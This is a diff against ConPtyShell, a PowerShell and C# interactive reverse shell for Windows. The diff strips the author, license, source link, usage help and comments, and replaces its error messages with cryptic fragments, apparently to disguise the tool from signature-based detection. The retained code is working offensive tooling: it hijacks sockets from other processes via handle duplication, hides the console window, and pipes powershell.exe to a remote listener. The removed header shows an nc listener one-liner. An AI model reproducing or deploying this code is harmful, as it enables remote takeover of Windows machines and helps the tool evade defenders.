@@ -1,73 +1,6 @@
 function Invoke-ConPtyShell
 {   
-    <#
-        .SYNOPSIS
-            ConPtyShell - Fully Interactive Reverse Shell for Windows 
-            Author: splinter_code
-            License: MIT
-            Source: https://github.com/antonioCoco/ConPtyShell
-        
-        .DESCRIPTION
-            ConPtyShell - Fully interactive reverse shell for Windows
-            
-            Properly set the rows and cols values. You can retrieve it from
-            your terminal with the command "stty size".
-            
-            You can avoid to set rows and cols values if you run your listener
-            with the following command:
-                stty raw -echo; (stty size; cat) | nc -lvnp 3001
-           
-            If you want to change the console size directly from powershell
-            you can paste the following commands:
-                $width=80
-                $height=24
-                $Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height)
-                $Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size -ArgumentList ($width, $height)
-            
-            
-        .PARAMETER RemoteIp
-            The remote ip to connect
-        .PARAMETER RemotePort
-            The remote port to connect
-        .PARAMETER Rows
-            Rows size for the console
-            Default: "24"
-        .PARAMETER Cols
-            Cols size for the console
-            Default: "80"
-        .PARAMETER CommandLine
-            The commandline of the process that you are going to interact
-            Default: "powershell.exe"
-            
-        .EXAMPLE  
-            PS>Invoke-ConPtyShell 10.0.0.2 3001
-            
-            Description
-            -----------
-            Spawn a reverse shell
-
-        .EXAMPLE
-            PS>Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90
-            
-            Description
-            -----------
-            Spawn a reverse shell with specific rows and cols size
-            
-         .EXAMPLE
-            PS>Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90 -CommandLine cmd.exe
-            
-            Description
-            -----------
-            Spawn a reverse shell (cmd.exe) with specific rows and cols size
-            
-        .EXAMPLE
-            PS>Invoke-ConPtyShell -Upgrade -Rows 30 -Cols 90
-            
-            Description
-            -----------
-            Upgrade your current shell with specific rows and cols size
-            
-    #>
+  
     Param
     (
         [Parameter(Position = 0)]
@@ -102,11 +35,11 @@ function Invoke-ConPtyShell
     else{
   
         if(-Not($PSBoundParameters.ContainsKey('RemoteIp'))) {
-            throw "RemoteIp missing parameter"
+            throw "Remoter"
         }
         
         if(-Not($PSBoundParameters.ContainsKey('RemotePort'))) {
-            throw "RemotePort missing parameter"
+            throw "Remoer"
         }
     }
     $parametersConPtyShell = @($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine)
@@ -116,7 +49,6 @@ function Invoke-ConPtyShell
 }
 
 $Source = @"
-
 using System;
 using System.IO;
 using System.Text;
@@ -162,7 +94,6 @@ public class DeadlockCheckHelper
         if (objPtr != IntPtr.Zero) Marshal.FreeHGlobal(objPtr);
         return 0;
     }
-
     public bool CheckDeadlockDetected(IntPtr tHandle)
     {
         this.deadlockDetected = true;
@@ -182,7 +113,6 @@ public class DeadlockCheckHelper
 
 public static class SocketHijacking
 {
-
     private const uint NTSTATUS_SUCCESS = 0x00000000;
     private const uint NTSTATUS_INFOLENGTHMISMATCH = 0xc0000004;
     private const uint NTSTATUS_BUFFEROVERFLOW = 0x80000005;
@@ -257,8 +187,8 @@ public static class SocketHijacking
         public uint TotalNonPagedPoolUsage;
         public uint TotalNamePoolUsage;
         public uint TotalHandleTableUsage;
-        public uint HighWaterNumberOfObjects;// PeakObjectCount;
-        public uint HighWaterNumberOfHandles;// PeakHandleCount;
+        public uint HighWaterNumberOfObjects;
+        public uint HighWaterNumberOfHandles;
         public uint HighWaterPagedPoolUsage;
         public uint HighWaterNonPagedPoolUsage;
         public uint HighWaterNamePoolUsage;
@@ -266,13 +196,13 @@ public static class SocketHijacking
         public uint InvalidAttributes;
         public GENERIC_MAPPING GenericMapping;
         public uint ValidAccessMask;
-        public byte SecurityRequired;//bool
-        public byte MaintainHandleCount;//bool
+        public byte SecurityRequired;
+        public byte MaintainHandleCount;
         public byte TypeIndex;
         public byte ReservedByte;
         public uint PoolType;
-        public uint DefaultPagedPoolCharge;// PagedPoolUsage;
-        public uint DefaultNonPagedPoolCharge;//NonPagedPoolUsage;
+        public uint DefaultPagedPoolCharge;
+        public uint DefaultNonPagedPoolCharge;
     }
 
     [StructLayout(LayoutKind.Sequential, Pack = 1)]
@@ -400,21 +330,7 @@ public static class SocketHijacking
         public UInt32 ReceiveTimeout;
         public UInt32 ReceiveBufferSize;
         public UInt32 SendBufferSize;
-        /* Those are the bits in the SocketProerty, proper order:
-            Listening;
-            Broadcast;
-            Debug;
-            OobInline;
-            ReuseAddresses;
-            ExclusiveAddressUse;
-            NonBlocking;
-            DontUseWildcard;
-            ReceiveShutdown;
-            SendShutdown;
-            ConditionalAccept;
-        */
         public ushort SocketProperty;
-        // Snapshot of several parameters passed into WSPSocket() when creating this socket
         public UInt32 CreationFlags;
         public UInt32 CatalogEntryId;
         public UInt32 ServiceFlags1;
@@ -422,9 +338,7 @@ public static class SocketHijacking
         public UInt32 GroupID;
         public AFD_GROUP_TYPE GroupType;
         public Int32 GroupPriority;
-        // Last error set on this socket
         public Int32 LastError;
-        // Info stored for WSAAsyncSelect()
         public IntPtr AsyncSelecthWnd;
         public UInt32 AsyncSelectSerialNumber;
         public UInt32 AsyncSelectwMsg;
@@ -523,7 +437,7 @@ public static class SocketHijacking
             infoLength = infoLength * 2;
             if (result == NTSTATUS_SUCCESS)
                 return infoPtr;
-            Marshal.FreeHGlobal(infoPtr);  //free pointer when not Successful
+            Marshal.FreeHGlobal(infoPtr); 
             if (result != NTSTATUS_INFOLENGTHMISMATCH && result != NTSTATUS_BUFFEROVERFLOW && result != NTSTATUS_BUFFERTOOSMALL)
             {
                 //throw new Exception("Unhandled NtStatus " + result);
@@ -540,15 +454,11 @@ public static class SocketHijacking
         return ptrObjectTypesInformation;
     }
 
-    // this from --> https://github.com/hfiref0x/UACME/blob/master/Source/Shared/ntos.h
     private static long AlignUp(long address, long align)
     {
         return (((address) + (align) - 1) & ~((align) - 1));
     }
 
-    // this works only from win8 and above. If you need a more generic solution you need to use the (i+2) "way" of counting index types.
-    // credits for this goes to @0xrepnz
-    // more information here --> https://twitter.com/splinter_code/status/1400873009121013765
     private static byte GetTypeIndexByName(string ObjectName)
     {
         byte TypeIndex = 0;
@@ -561,7 +471,6 @@ public static class SocketHijacking
         for (int i = 0; i < TypesCount; i++)
         {
             OBJECT_TYPE_INFORMATION_V2 Type = (OBJECT_TYPE_INFORMATION_V2)Marshal.PtrToStructure(ptrTypesInfoCurrent, typeof(OBJECT_TYPE_INFORMATION_V2));
-            // move pointer to next the OBJECT_TYPE_INFORMATION_V2 object
             ptrTypesInfoCurrent = (IntPtr)(ptrTypesInfoCurrent.ToInt64() + AlignUp(Type.TypeName.MaximumLength, (long)IntPtr.Size) + Marshal.SizeOf(typeof(OBJECT_TYPE_INFORMATION_V2)));
             if (Type.TypeName.Length > 0 && Marshal.PtrToStringUni(Type.TypeName.Buffer, Type.TypeName.Length / 2) == ObjectName)
             {
@@ -582,7 +491,6 @@ public static class SocketHijacking
             IntPtr dupedSocket = DuplicateSocketFromHandle(sock);
             if (dupedSocket != IntPtr.Zero) dupedSocketsOut.Add(dupedSocket);
         }
-        // cleaning all socket handles
         foreach (IntPtr sock in sockets)
             CloseHandle(sock);
         return dupedSocketsOut;
@@ -634,7 +542,6 @@ public static class SocketHijacking
         result = WSAIoctl1(socket, SIO_TCP_INFO, ref tcpInfoVersion, Marshal.SizeOf(tcpInfoVersion), tcpInfoPtr, tcpInfoSize, ref bytesReturned, IntPtr.Zero, IntPtr.Zero);
         if (result != 0)
         {
-            // Console.WriteLine("debug: WSAIoctl1 failed with return code " + result.ToString() + " and wsalasterror: " + WSAGetLastError().ToString());
             tcpInfoOut = new TCP_INFO_v0();
             return false;
         }
@@ -644,7 +551,7 @@ public static class SocketHijacking
         return true;
     }
 
-    // this function take a raw handle to a \Device\Afd object as a parameter and returns a handle to a duplicated socket
+
     private static IntPtr DuplicateSocketFromHandle(IntPtr socketHandle)
     {
         IntPtr retSocket = IntPtr.Zero;
@@ -653,8 +560,7 @@ public static class SocketHijacking
         int status = WSADuplicateSocket(socketHandle, Process.GetCurrentProcess().Id, ref wsaProtocolInfo);
         if (status == 0)
         {
-            // we need an overlapped socket for the conpty process but we don't need to specify the WSA_FLAG_OVERLAPPED flag here because it will be ignored (and automatically set) by WSASocket() function if we set the WSAPROTOCOL_INFO structure and if the original socket has been created with the overlapped flag.
-            duplicatedSocket = WSASocket(wsaProtocolInfo.iAddressFamily, wsaProtocolInfo.iSocketType, wsaProtocolInfo.iProtocol, ref wsaProtocolInfo, 0, 0);
+             duplicatedSocket = WSASocket(wsaProtocolInfo.iAddressFamily, wsaProtocolInfo.iSocketType, wsaProtocolInfo.iProtocol, ref wsaProtocolInfo, 0, 0);
             if (duplicatedSocket.ToInt64() > 0)
             {
                 retSocket = duplicatedSocket;
@@ -688,7 +594,7 @@ public static class SocketHijacking
             }
         }
         if (result == NTSTATUS_SUCCESS)
-            return infoPtr;//don't forget to free the pointer with Marshal.FreeHGlobal after you're done with it
+            return infoPtr;
         else
             Marshal.FreeHGlobal(infoPtr);//free pointer when not Successful
         return IntPtr.Zero;
@@ -728,15 +634,13 @@ public static class SocketHijacking
             {
                 break;
             }
-            //move pointer to next SYSTEM_HANDLE_TABLE_ENTRY_INFO
             ptrHandlesInfoCurrent = (IntPtr)(ptrHandlesInfoCurrent.ToInt64() + Marshal.SizeOf(typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO)));
             if (sysHandle.UniqueProcessId != targetProcess.Id || sysHandle.ObjectTypeIndex != TypeIndexFileObject)
                 continue;
             if (DuplicateHandle(hTargetProcess, (IntPtr)sysHandle.HandleValue, GetCurrentProcess(), out dupHandle, 0, false, DUPLICATE_SAME_ACCESS))
             {
                 if (deadlockCheckHelperObj.CheckDeadlockDetected(dupHandle))
-                { // this will avoids deadlocks on special named pipe handles
-                    // Console.WriteLine("debug: Deadlock detected");
+                {
                     CloseHandle(dupHandle);
                     continue;
                 }
@@ -758,7 +662,6 @@ public static class SocketHijacking
                 if (objNameInfo.Name.Buffer != IntPtr.Zero && objNameInfo.Name.Length > 0)
                 {
                     strObjectName = Marshal.PtrToStringUni(objNameInfo.Name.Buffer, objNameInfo.Name.Length / 2);
-                    // Console.WriteLine("debug: file handle 0x" + dupHandle.ToString("X4") + " strObjectName = " + strObjectName);
                     if (strObjectName == "\\Device\\Afd")
                         socketsHandles.Add(dupHandle);
                     else
@@ -844,17 +747,15 @@ public static class SocketHijacking
         {
             foreach (IntPtr socketHandle in targetProcessSockets)
             {
-                // we prioritize the hijacking of Overlapped sockets
                 if (!IsSocketOverlapped(socketHandle))
                 {
-                    // Console.WriteLine("debug: Found a usable socket, but it has not been created with the flag WSA_FLAG_OVERLAPPED, skipping...");
+       
                     continue;
                 }
                 targetSocketHandle = socketHandle;
                 overlappedSocket = true;
                 break;
             }
-            // no Overlapped sockets found, expanding the scope by including also Non-Overlapped sockets
             if (targetSocketHandle == IntPtr.Zero) {
                 // Console.WriteLine("debug: No overlapped sockets found. Trying to return also non-overlapped sockets...");
                 foreach (IntPtr socketHandle in targetProcessSockets)
@@ -1193,7 +1094,7 @@ public static class ConPtyShell
 
     private static void TryParseRowsColsFromSocket(IntPtr shellSocket, ref uint rows, ref uint cols)
     {
-        Thread.Sleep(500);//little tweak for slower connections
+        Thread.Sleep(800);
         byte[] received = new byte[100];
         int rowsTemp, colsTemp;
         int bytesReceived = recv(shellSocket, received, 100, 0);
@@ -1529,10 +1430,6 @@ public static class ConPtyShell
                 ShowWindow(GetConsoleWindow(), SW_HIDE);
                 newConsoleAllocated = true;
             }
-            // debug code for checking handle duplication
-            // Console.WriteLine("debug: Creating pseudo console...");
-            // Thread.Sleep(180000);
-            // return "";
             int pseudoConsoleCreationResult = CreatePseudoConsoleWithPipes(ref handlePseudoConsole, ref InputPipeRead, ref OutputPipeWrite, rows, cols);
             if (pseudoConsoleCreationResult != 0)
             {
@@ -1563,9 +1460,6 @@ public static class ConPtyShell
             sInfo.hStdError = OutputPipeWrite;
             CreateProcess(null, commandLine, IntPtr.Zero, IntPtr.Zero, true, 0, IntPtr.Zero, null, ref sInfo, out childProcessInfo);
         }
-        // Note: We can close the handles to the PTY-end of the pipes here
-        // because the handles are dup'ed into the ConHost and will be released
-        // when the ConPTY is destroyed.
         if (InputPipeRead != IntPtr.Zero) CloseHandle(InputPipeRead);
         if (OutputPipeWrite != IntPtr.Zero) CloseHandle(OutputPipeWrite);
         if (upgradeShell) {
@@ -1619,7 +1513,7 @@ public static class ConPtyShellMainClass
     private static void CheckArgs(string[] arguments)
     {
         if (arguments.Length < 2)
-            throw new ConPtyShellException("\r\nConPtyShell: Not enough arguments. 2 Arguments required. Use --help for additional help.\r\n");
+            throw new ConPtyShellException("\r\n 2 arg p.\r\n");
     }
 
     private static void DisplayHelp()
@@ -1631,7 +1525,7 @@ public static class ConPtyShellMainClass
     {
         IPAddress address;
         if (!IPAddress.TryParse(ipString, out address))
-            throw new ConPtyShellException("\r\nConPtyShell: Invalid remoteIp value" + ipString);
+            throw new ConPtyShellException("\r\n Rip" + ipString);
         return ipString;
     }
 
@@ -1639,7 +1533,7 @@ public static class ConPtyShellMainClass
     {
         int ret = 0;
         if (!Int32.TryParse(arg, out ret))
-            throw new ConPtyShellException("\r\nConPtyShell: Invalid integer value " + arg);
+            throw new ConPtyShellException("\r\ninteger ve " + arg);
         return ret;
     }
 
@@ -1694,9 +1588,9 @@ public static class ConPtyShellMainClass
                 string commandLine = ParseCommandLine(args);
                 output = ConPtyShell.SpawnConPtyShell(remoteIp, remotePort, rows, cols, commandLine, upgradeShell);
             }
-            catch (Exception e)
+            catch (Exception b)
             {
-                Console.WriteLine("\n" + e.ToString() + "\n");
+                Console.WriteLine("\n" + b.ToString() + "\n");
             }
         }
         return output;
